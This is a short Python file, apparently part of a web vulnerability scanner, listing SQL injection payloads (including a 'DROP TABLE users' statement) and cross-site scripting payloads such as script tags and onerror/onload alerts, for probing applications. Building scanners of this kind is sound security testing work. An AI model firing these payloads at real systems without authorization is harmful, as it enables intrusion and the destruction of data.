# scanner/payloads.py

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR 1=1#",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]
